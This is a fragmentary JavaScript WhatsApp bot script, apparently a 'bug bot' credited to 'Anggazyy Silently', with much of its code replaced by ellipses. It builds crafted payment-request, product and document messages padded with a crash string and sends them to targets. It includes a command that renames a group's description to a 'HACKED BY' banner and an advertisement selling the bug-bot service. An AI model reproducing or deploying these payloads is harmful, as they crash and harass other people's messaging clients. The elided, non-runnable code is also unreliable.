...
🌷 KALAU MAU RENAME TARO CREDITS GUA : Anggazyy Silently */
...
const fakegroup = (teks) => {
    ...
    const buttonsDefault = [
			{ callButton: { displayText: `Call Owner!`, phoneNumber: `+62882021734861` } },
...
//=================================================//
const reply = (teks) => {
return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC Anggazyy Silently`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://wa.me/62882021734861`}}}, { quoted: m })} 
//=================================================//
try {
...
adehvn = { 
 ...
 anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: doc})
...
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER Anggazyy Silently`,
}
...
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER ANGGAZYY XHSAMERS X VIP`,
}
}}), { userJid: m.chat, quoted: doc})
haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
...
"title": `© ANGGAZYY XHSAMERS X VIP${ngazap(prefix)}`,
"description": `© ANGGAZYY XHSAMERS X VIP`,
"currencyCode": "IDR",
"footerText": `© ANGGAZYY XHSAMERS X VIP`,
"productImageCount": 1,
"firstImageId": 1,
"retailerId": `© ANGGAZYY XHSAMERS X VIP WE ARE NOT MASTOD`,
...
"fileName": `Anggazyy Silently${ngazap(prefix)}`,
...
urlButton: {
displayText: `GITHUB`,
url: 'https://wa.me/62882021734861'
}
},
{
quickReplyButton: {
...
\n\n*WELCOME\n\n
bugcrot
bugahay `, `Anggazyy Silently${ngazap(prefix)}`, m)
}
}
break
//=================================================//
...
case 'sc': {
if (isBan) throw sticBanLu(from)
reply('𝐏𝐑𝐎𝐌𝐎𝐓𝐄\n\nMau join own bug atau jadi bot bug murah meriah?bisa cp *Anggazyy* harga terjangkau online 24×7 Jam, Free Akun Heroku Premium 100 Dynos,\n\nMinat?Pc *Anggazyy wa.me/62882021734861*')
}
break
//=================================================//
case 'chat': {
...
await sleep(1000)
haikal.groupUpdateDescription(from, `_${pushname} HACKED BY ANGGAZYY X 666 SATANIC-X_`)             
await sleep(1000)
...
╔════[ 𝐕𝐈𝐏𝟐 ]══════⊱
╠➤ 𝐚𝐟𝐤 { 𝐤𝐚𝐬𝐢𝐡 𝐫𝐞𝐚𝐜𝐭𝐢𝐨𝐧𝐬 }
╠➤ 𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐠𝐡𝐨𝐢𝐛 [ 𝐨𝐧 / 𝐨𝐟𝐟 ]
╠➤ 𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐣𝐚𝐠𝐨𝐚𝐧 [ 𝐫𝐞𝐩𝐥𝐲 𝐭𝐚𝐫𝐠𝐞𝐭 ]
╠➤ 𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐬𝐚𝐧𝐠𝐞 [ 𝐇𝐚𝐫𝐮𝐬 𝐌𝐞𝐧𝐣𝐚𝐝𝐢 𝐀𝐝𝐦𝐢𝐧 ]
...
╠➤ 𝐬𝐨𝐮𝐧𝐝𝟏𝟔𝟎
╚════[ 𝕬𝖓𝖌𝖌𝖆 𝕾𝖆𝖙𝖆𝖓𝖎𝖈 ]═════⊱`,
contextInfo:{"externalAdReply": {"title": `Anggazyy Silently`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://wa.me/62882021734861`,
thumbnailUrl: 'https://i.ibb.co/T1jCqF4/IMG-20221024-WA0002.jpg', 
...
kesel
ngeselin`,
contextInfo:{"externalAdReply": {"title": `SC Anggazyy Silently`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://wa.me/62882021734861`,
thumbnailUrl: 'https://i.ibb.co/T1jCqF4/IMG-20221024-WA0002.jpg', 
